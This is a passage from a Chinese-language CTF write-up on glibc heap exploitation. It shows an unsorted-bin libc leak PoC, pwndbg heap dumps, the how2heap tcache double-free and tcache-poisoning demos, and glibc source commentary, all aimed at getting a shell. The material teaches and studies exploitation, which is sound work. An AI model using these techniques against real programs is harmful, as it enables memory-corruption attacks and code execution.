      if ( size > 0x2000 )
        exit(-2);
      note_chunk = malloc(size);
我们简单的做个unsort_bin_attack尝试把这个地址写入到chunk上
    #poc
    new(0x500,'aaaaa')
    new(0x10,'bbbb')
    free(1)
    free(0)
    pwndbg> parseheap
    addr                prev                size                 status              fd                bk
    0x55763fe59000      0x0                 0x250                Used                None              None
    0x55763fe59250      0x0                 0x510                Freed     0x7f74dac85c78    0x7f74dac85c78
    0x55763fe59760      0x510               0x20                 Used                None              None
    pwndbg> x/8x 0x55763fe59250
    0x55763fe59250: 0x0000000000000000  0x0000000000000511
    0x55763fe59260: 0x00007f74dac85c78  0x00007f74dac85c78  parseheap
    addr                prev                size                 status              fd                bk
    0x55a2d6e3a000      0x0                 0x250                Used                None              None
    0x55a2d6e3a250      0x0                 0x510                Freed     0x7fba63b37c78    0x7fba63b37c78
    0x55a2d6e3a760      0x510               0x30                 Freed 0x61616161616161610x6161616161616161
    0x55a2d6e3a790      0x540               0x500                Used                None              None
    0x55a2d6e3ac90      0x0                 0x20                 Used                None              None
    pwndbg> x/8x 0x55a2d6e3a760
    0x55a2d6e3a760: 0x0000000000000510  0x0000000000000030
    0x55a2d6e3a770: 0x6161616161616161  0x6161616161616161
    0x55a2d6e3a780: 0x6161616161616161  0x6161616161616161
    0x55a2d6e3a790: 0x0000000000000540  0x0000000000000500
    pwndbg> x/8x 0x55a2d6e3a790
    0x55a2d6e3a790: 0x0000000000000540  0x0000000000000500
    0x55a2d6e3a7a0: 0x0000000063636363  0x0000000000000000
    0x55a2d6e3a7b0: 0x0000000000000000  0x0000000000000000
    0x55a2d6e3a7c0: 0x0000000000000000  0x0000000000000000
    #free after
    pwndbg> parseheap
    addr                prev                size                 status              fd                bk
    0x563204289000      0x0                 0x250                Used                None              None
    0x563204289250      0x0                 0xa40                Freed     0x7f01905acc78    0x7f01905acc78
    0x563204289c90      0xa40               0x20                 Used                None              None
    pwndbg> x/8x 0x563204289250
    0x563204289250: 0x0000000000000000  0x0000000000000a41
    0x563204289260: 0x00007f01905acc78  0x00007f01905acc78
    0x563204289270: 0x0000000000000000  0x0000000000000000
    0x563204289280: 0xdadadadadadadada  0xdadadadadadadada
    pwndbg>
这时我们再新建一个chunk分配大小和chunk0一样时，chunk就会分配到chunk0所在的位置，这时我们show(0)即可leak_libc
这样我们所有的前置工作就做好了，接着就是通过tcache_dup和tcache_poisoning来getshell了
首先我们先通过how2heap了解下
    #include 
    #include 
    //tcache_dup
    int main()
    {
        fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");
        fprintf(stderr, "Allocating buffer.\n");
        int *a = malloc(8);
        fprintf(stderr, "malloc(8): %p\n", a);
        fprintf(stderr, "Freeing twice...\n");
        free(a);
        free(a);
        fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
        fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
        return 0;
    }
    #include 
    #include 
    #include 
    // tcache poisoning
    int main()
    {
        "This file demonstrates a simple tcache poisoning attack by tricking malloc into"
        "returning a pointer to an arbitrary location (in this case, the stack)."
        "The attack is very similar to fastbin corruption attack."
        size_t stack_var;
        fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&stack_var);
        "Allocating 1 buffer."
        intptr_t *a = malloc(128);
        fprintf(stderr, "malloc(128): %p\n", a);
        "Freeing the buffer..."
        free(a);
        fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
        fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
            "to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
        a[0] = (intptr_t)&stack_var;
        fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
        fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
        intptr_t *b = malloc(128);
        fprintf(stderr, "2nd malloc(128): %p\n", b);
        "We got the control"
        return 0;
    }
我们可以很明显的感受到tcache_dup就是弱化版的fastbin_double_free，我们先看一下源码相关的函数
    tcache_put (mchunkptr chunk, size_t tc_idx)
    {
          tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
          assert (tc_idx next = tcache->entries[tc_idx];
          tcache->entries[tc_idx] = e;
          ++(tcache->counts[tc_idx]);
    }
这就是我之前所说过引入tcache机制降低了安全性的一个体现，本来应该要有tcache->counts[tc_idx]
的相关检验，却为提升效率而去掉了，这也侧面的说明安全和性能处在一个此消彼长的状态
我们简单的调试下tcache_dup
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x55a661cd5270 (size : 0x20d90) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x0
    (0x20)   tcache_entry[0]: 0x55a661cd5260 --> 0x55a661cd5260 (overlap chunk with 0x55a661cd5250(freed) )
我们直接free两次同一个chunk，就能直接得到两个指向同一块内存区域的指针，这无疑比正常在fastbin下的double free简易许多
接着我们看下tcache_poisoning，简单来说tcache_poisoning就是一个通过覆盖tcache_next就直接可以malloc到任意地址去将其覆盖为one_gadget或是别的东西去进行利用的一个很万金油的用法，我们调试下how2heap给的程序
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x55a464be82e0 (size : 0x20d20) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x0
    (0x90)   tcache_entry[7]: 0x55a464be8260
它先往tcache里面放了一个0x80的chunk，然后我们再看下修改了tcache_next后的tcache_entry是怎么样的
    ────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────
       20   fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
       21   fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
       22       "to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
       23   a[0] = (intptr_t)&stack_var;
       24 
     ► 25   fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
       26   fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
       27 
       28   intptr_t *b = malloc(128);
       29   fprintf(stderr, "2nd malloc(128): %p\n", b);